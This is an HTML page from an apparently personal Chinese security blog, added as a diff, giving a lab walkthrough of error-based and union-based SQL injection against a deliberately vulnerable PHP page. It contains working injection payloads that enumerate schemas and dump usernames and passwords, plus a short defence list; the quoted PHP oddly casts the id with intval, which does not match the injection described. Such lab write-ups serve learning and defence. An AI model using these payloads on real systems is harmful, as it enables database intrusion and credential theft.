@@ -1,0 +1,1018 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="sql注入," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+
+<meta name="description" content="sql-1:GET-Error based -single quotes - String(1)
+ 除了家人不要让任何人知道自己的想法，老柯里昂说的话，宝强马蓉他们证明了找到一个能相信的外姓家人吗">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入1:GET-报错 -单引号 - 字符(1)">
+<meta property="og:url" content="https://shawnleon.github.io/2016/08/02/sql-1-GET-Error-based-single-quotes-String/index.html">
+<meta property="og:site_name" content="THE WEAK ARE HARD TO GET THE FAIR">
+<meta property="og:description" content="sql-1:GET-Error based -single quotes - String(1)
+ 除了家人不要让任何人知道自己的想法，老柯里昂说的话，宝强马蓉他们证明了找到一个能相信的外姓家人吗">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/qqc.jpg">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/3.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/4.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/6.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/7.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/10.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/11.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/12.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/13.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/14.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/15.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/16.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/17.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/18.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/19.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/20.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/21.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/22.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/23.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/24.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/25.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/26.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/27.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/sql-1/28.png">
+<meta property="og:updated_time" content="2016-08-25T09:59:00.579Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入1:GET-报错 -单引号 - 字符(1)">
+<meta name="twitter:description" content="sql-1:GET-Error based -single quotes - String(1)
+ 除了家人不要让任何人知道自己的想法，老柯里昂说的话，宝强马蓉他们证明了找到一个能相信的外姓家人吗">
+<meta name="twitter:image" content="https://shawnleon.github.io/images/sql-1/qqc.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="https://shawnleon.github.io/2016/08/02/sql-1-GET-Error-based-single-quotes-String/"/>
+
+  <title> sql注入1:GET-报错 -单引号 - 字符(1) | THE WEAK ARE HARD TO GET THE FAIR </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta custom-logo">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">THE WEAK ARE HARD TO GET THE FAIR</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">THE ONLY FAIR IS NOT FAIR</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-board">
+          <a href="/board" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />
+            
+            留言板
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="st-search-show-outputs">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <form class="site-search-form">
+  <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
+</form>
+
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install', 'ueXsZP8kWT66wb-z9nvw','2.0.0');
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                sql注入1:GET-报错 -单引号 - 字符(1)
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-08-02T20:41:40+08:00" content="2016-08-02">
+              2016-08-02
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/02/sql-1-GET-Error-based-single-quotes-String/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/02/sql-1-GET-Error-based-single-quotes-String/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+              &nbsp; | &nbsp;
+              <span class="page-pv"><i class="fa fa-file-o"></i>
+              <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+              </span>
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="sql-1-GET-Error-based-single-quotes-String-1"><a href="#sql-1-GET-Error-based-single-quotes-String-1" class="headerlink" title="sql-1:GET-Error based -single quotes - String(1)"></a><strong>sql-1:GET-Error based -single quotes - String(1)</strong></h1><hr>
+<p><img src="/images/sql-1/qqc.jpg" alt="image"><br><strong> 除了家人不要让任何人知道自己的想法，老柯里昂说的话，宝强马蓉他们证明了找到一个能相信的外姓家人吗</strong></p>
+<a id="more"></a>
+<h4 id="所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。"><a href="#所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。" class="headerlink" title="所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。"></a>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</h4><h4 id="本次测试使用本地的环境"><a href="#本次测试使用本地的环境" class="headerlink" title="本次测试使用本地的环境."></a>本次测试使用本地的环境.</h4><hr>
+<h2 id="0x01原理分析"><a href="#0x01原理分析" class="headerlink" title="0x01原理分析"></a>0x01原理分析</h2><hr>
+<p>代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//including the Mysql connect parameters.</span></div><div class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="comment">// take the variables </span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</div><div class="line">&#123;	</div><div class="line">$id=intval($_GET[<span class="string">'id'</span>]);</div><div class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></div><div class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</div><div class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</div><div class="line">fclose($fp);</div><div class="line"><span class="comment">// connectivity </span></div><div class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</div><div class="line">$result=mysql_query($sql);</div><div class="line">$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>($row)</div><div class="line">	&#123;</div><div class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</div><div class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</div><div class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</div><div class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</div><div class="line">  	&#125;</div><div class="line">	<span class="keyword">else</span> </div><div class="line">	&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</div><div class="line">	print_r(mysql_error());</div><div class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>由于没有过滤参数,导致传入数据库的语句不但能够完成本次的查询,还能进行其他的语句查询<code>id=&#39;\$id&#39;</code>是字符型注入,在传入的sql语句查询数据库的时候在闭合掉<code>&#39;\$id&#39;</code>的后面一个单’并用<code>--+/-- -/#(%23)</code>注释后面的语句后即可加上其他语句来注入.<br>get型参数显示,就可以在url后面加上?id=1.</p>
+<hr>
+<h2 id="0x02-注入演示"><a href="#0x02-注入演示" class="headerlink" title="0x02 注入演示"></a>0x02 注入演示</h2><hr>
+<h3 id="注入验证"><a href="#注入验证" class="headerlink" title="注入验证"></a>注入验证</h3><p>正常的页面带有显示位。显示位是能显示你想要获取到信息的位置<br><img src="/images/sql-1/3.png" alt="image"></p>
+<p>加单引号后的页面<br><img src="/images/sql-1/4.png" alt="image"></p>
+<h3 id="union-select注入"><a href="#union-select注入" class="headerlink" title="union select注入"></a>union select注入</h3><h4 id="由于环境中有显示位-我们先来使用union-select联合查询语句"><a href="#由于环境中有显示位-我们先来使用union-select联合查询语句" class="headerlink" title="由于环境中有显示位,我们先来使用union select联合查询语句."></a>由于环境中有显示位,我们先来使用<code>union select</code>联合查询语句.</h4><p><code>union select</code> 语句的使用条件是,前面一个表的列数量(字段)须得和<code>union select</code>查询出来的列数量(字段)一致.<br>所以我们通过<code>order by</code>排序 先来判断有多少个列.如下图所示,没有10列,通过二分法最后得知有3列,大概就是<code>id,username,passwd</code>正常的表不会只有这3列的吧.<br><img src="/images/sql-1/6.png" alt="image"><br><img src="/images/sql-1/7.png" alt="image"><br><code>order by 3</code>正常显示 ,  <code>order by 4</code> 就不正常显示说明有3列</p>
+<p>** 在<code>union select</code> 联合查询时，<code>?id=-1&#39; union select 1,2,3;</code>由于<code>id=-1</code>时候查询的表会是<code>0 rows</code>而达到只显示union select 1,2,3 后查询的表。</p>
+<p>数据库中显示了1 2 3<br><img src="/images/sql-1/10.png" alt="image"></p>
+<p>执行语句之后,如下图显示:</p>
+<p><img src="/images/sql-1/11.png" alt="image"><br>我们通过知道了显示位是2和3.就可以尝试查询数据库,当前连接数据库的用户,版本号,等信息.<br><img src="/images/sql-1/12.png" alt="image"><br><img src="/images/sql-1/13.png" alt="image"><br> 数据库:<code>security</code>|| 当前连接数据库的用户:<code>root</code> || 版本号:  <code>5.5.40</code>  </p>
+<p>在MySQL数据库中，把 <code>information_schema</code> 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。在<code>information_schema中,schema,tables,columns</code>表需要用的.具体可查看我的博客其他介绍<code>information_schema</code></p>
+<p>** 通过查询来看到schema中有几个数据库,和第一个是什么<br><img src="/images/sql-1/14.png" alt="image"><br>代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?id=<span class="number">-1</span><span class="string">' union select 1,</span></div><div class="line">(select count(distinct table_schema) from information_schema.tables),</div><div class="line">(select distinct table_schema from information_schema.tables limit 0,1) --+</div></pre></td></tr></table></figure></p>
+<p> <code>count(distinct table_schema )</code>去重查询有几个表,<code>limit 0,1</code>显示第一行信息.因为查询出来的表是很多行,<br><img src="/images/sql-1/15.png" alt="image"><br><code>group_concat( )</code>把查询的结果以 , 分割显示一行,如果显示位字段数量少就不要用，或者查看源代码。</p>
+<p>数据库是:</p>
+<blockquote>
+<p>information_schema</p>
+<ul>
+<li>mysql</li>
+<li>performance_schema</li>
+<li>rank</li>
+<li>security</li>
+<li>user</li>
+</ul>
+</blockquote>
+<p>当查询结果中有<code>mysql</code>库的时候表示sa最高权限</p>
+<p>** 因为当前的数据库是security,所以查此库中的有用的表.</p>
+<p><img src="/images/sql-1/16.png" alt="image"><br>代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; ?id=<span class="number">-1</span><span class="string">' union select 1,(select count(distinct table_name) from information_schema.tables),</span></div><div class="line">(select group_concat(distinct table_name) from information_schema.tables where table_schema=database() limit 0,1) </div><div class="line">--+   //database 可以替换成其他库名</div></pre></td></tr></table></figure></p>
+<p>有88个表,当前数据库的表有:</p>
+<blockquote>
+<p>emails<br>referers<br>uagents<br>users</p>
+</blockquote>
+<p>** users 表里有哪些字段<br><img src="/images/sql-1/17.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=-1&apos; union select 1,(select count(distinct column_name) from information_schema.columns where table_schema=database() and table_name =0x7573657273 limit 0,1 ),(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name =0x7573657273 limit 0,1) --+</div></pre></td></tr></table></figure>
+<p>在users表中有3列(上面order by),分别是: <code>id,username,password</code></p>
+<p>** 现在查询username,password里面的内容<br><img src="/images/sql-1/18.png" alt="image"></p>
+<p>代码<br><figure class="highlight plain"><figcaption><span>union select 1,(select group_concat(0x7e,username,0x7e,password) from users) ,3 --+</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//为了方便把两个字段区分开,写脚本的时候也可以按照自己的格式匹配比较容易</div></pre></td></tr></table></figure></p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>报错注入存在是因为在程序猿写代码时候看报错信息方便自己更好更快写网站时候输出了mysql_error,写完网站后忘记注释掉,引起了报错显示.</p>
+<p>报错注入有几种，在这我暂时之研究了利用floor报错</p>
+<p>先来看一下rand()随机数:</p>
+<p>+——————+<br>| floor(rand(0)<em>2) |<br>+——————+<br>|                0 |<br>|                1 |<br>|                1 |<br>|                0 |<br>|                1 |<br>|                1 |<br>|                0 |<br>|                0 |<br>+——————+<br>mysql&gt; select floor(rand(0)</em>2) from users;</p>
+<p>+——————+<br>| floor(rand(0)*2) |<br>+——————+<br>|                0 |<br>|                1 |<br>|                1 |<br>|                0 |<br>|                1 |<br>|                1 |<br>|                0 |<br>|                0 |<br>|                1 |<br>|                1 |<br>|                1 |<br>|                0 |<br>|                1 |<br>+——————+</p>
+<p>我们可以发现，<code>rand(0)*2</code> 是一个随机的值，但是出现的顺序确是固定的，可以称之为为固定的随机值 .</p>
+<p>原理：通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是<code>floor(rand(0)*2)</code>的不确定性，即可能为0也可能为1（<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<code>group by floor(random(0)*2)</code>出错的原因是key是个随机数，</p>
+<p><img src="/images/sql-1/19.png" alt="image"></p>
+<p>在选择的时候出现一个随机数,检测临时表中key是否存在时有出现了一个随机数，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值相同。此链接详细介绍 :取第一条记录，执行<code>floor(rand(0)*2)</code>，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则<code>floor(rand(0)*2)</code>会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完. 接着查询第二条记录，再次计算<code>floor(rand(0)*2)</code>，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以<code>floor(rand(0)*2)</code>不会被计算第二次，直接<code>count(*)</code>加1，第二条记录查询完毕.再接着 查询第三条记录，再次计算<code>floor(rand(0)*2)</code>，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在 插入数据时<code>floor(rand(0)*2)</code>被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为 1(主键键值必须唯一)，所以插入的时候就直接报错了。 整个查询过程<code>floor(rand(0)*2)</code>被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因. 详情在乌云知识库就有.笔者重新markdown语法编辑的时候乌云还未重开。</p>
+<h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><p>mysql&gt; select floor(rand(0)<em>2),count(</em>) from mysql.user group by floor(rand(0)*2<br>);<br>ERROR 1062 (23000): Duplicate entry ‘1’ for key ‘group_key’<br><img src="/images/sql-1/20.png" alt="image"></p>
+<p>利用：我们只要将数据携带进入rand(0) ，那么这个值就可以被放入到报错的地方<br>命令行查询版本信息:<br>mysql&gt; select count(<em>),concat(version(),floor(rand(0)</em>2))x from  information_schema.tables group by x;</p>
+<p><img src="/images/sql-1/21.png" alt="image"></p>
+<p>获取库的个数:<br>代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">+and(select 1 from(select count(*),concat((select (select (select concat(0x7e7e3a7e7e, count(distinct+table_schema),0x7e7e3a7e7e) from information_schema.tables)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</div><div class="line">--+</div></pre></td></tr></table></figure></p>
+<p><img src="/images/sql-1/22.png" alt="image"><br>后面1是随机数<br>获取库名称: <code>limit 0,1</code> 来显示获取的第几个库,直到判断到库的数量.<br><img src="/images/sql-1/23.png" alt="image"></p>
+<p>获取某一个数据库的表名:<br>代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e, table_name, 0x7e7e3a7e7e) from information_schema.tables where table_schema=0x7365637572697479 limit 0,1</div><div class="line">)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</div><div class="line">--+</div></pre></td></tr></table></figure></p>
+<p><code>table_schema=0x7365637572697479</code>      库名的16进制转换.<br><img src="/images/sql-1/24.png" alt="image"></p>
+<p>获取某一个数据库，某一个表的列:<br>代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(column_name),0x7e7e3a7e7e) from information_schema.columns where table_name=0x656d61696c73 and table_schema=0x7365637572697479</div><div class="line">)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</div></pre></td></tr></table></figure></p>
+<p><img src="/images/sql-1/25.png" alt="image"></p>
+<p>显示<code>emails</code>表有几行内容:<br>代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">+and(select 1 from(select count(*),concat((select (select ( select count(*) from security.emails</div><div class="line">)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</div><div class="line">--+</div></pre></td></tr></table></figure></p>
+<p><img src="/images/sql-1/26.png" alt="image"></p>
+<p>显示<code>emails</code>里面的某行:</p>
+<p>代码:<br><figure class="highlight plain"><figcaption><span>1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,id, 0x20,email_id,0x7e7e3a7e7e) from security.emails limit 0,1</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</div><div class="line">--+</div></pre></td></tr></table></figure></p>
+<p><img src="/images/sql-1/27.png" alt="image"></p>
+<p>根据user表查密码,登录的数据库名字,使用的数据库<br>代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1&apos; and (select 1 from  (select count(*),concat( (select concat(0x7e,username,0x7e,password) from users where id =1),0x7e,user(),0x7e,database(),0x7e,floor(rand(0)*2))x from  information_schema.tables group by x)a); --+</div></pre></td></tr></table></figure></p>
+<p><img src="/images/sql-1/28.png" alt="image"></p>
+<h2 id="0x03防护"><a href="#0x03防护" class="headerlink" title="0x03防护"></a>0x03防护</h2><blockquote>
+<ul>
+<li>永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和<br>双”-“进行转换等。</li>
+<li>永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。</li>
+<li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li>
+<li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装</li>
+</ul>
+</blockquote>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>报错注入还有其他类型的,暂时没有研究.回来会加上去的.php写的少所以sql注入防护还不是很会,加油，fish.</p>
+<p><strong>题外话：如果你对本站文章字体有任何不适，请告知我，我会回复你，字体请让浏览器调到对眼睛舒适的大小;默认不允许转载，除非转载注明出处。</strong></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql注入/" rel="tag">#sql注入</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/08/01/Sensitive-information-leakage/" rel="next" title="敏感信息泄露">
+                <i class="fa fa-chevron-left"></i> 敏感信息泄露
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/08/03/linux-let-me-in/" rel="prev" title="linux 学习（1）">
+                linux 学习（1） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <div class="ds-share flat" data-thread-key="2016/08/02/sql-1-GET-Error-based-single-quotes-String/"
+     data-title="sql注入1:GET-报错 -单引号 - 字符(1)"
+     data-content=""
+     data-url="https://shawnleon.github.io/2016/08/02/sql-1-GET-Error-based-single-quotes-String/">
+  <div class="ds-share-inline">
+    <ul  class="ds-share-icons-16">
+
+      <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+      <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+      <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+      <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+      <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+
+    </ul>
+    <div class="ds-share-icons-more">
+    </div>
+  </div>
+</div>
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/08/02/sql-1-GET-Error-based-single-quotes-String/"
+           data-title="sql注入1:GET-报错 -单引号 - 字符(1)" data-url="https://shawnleon.github.io/2016/08/02/sql-1-GET-Error-based-single-quotes-String/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
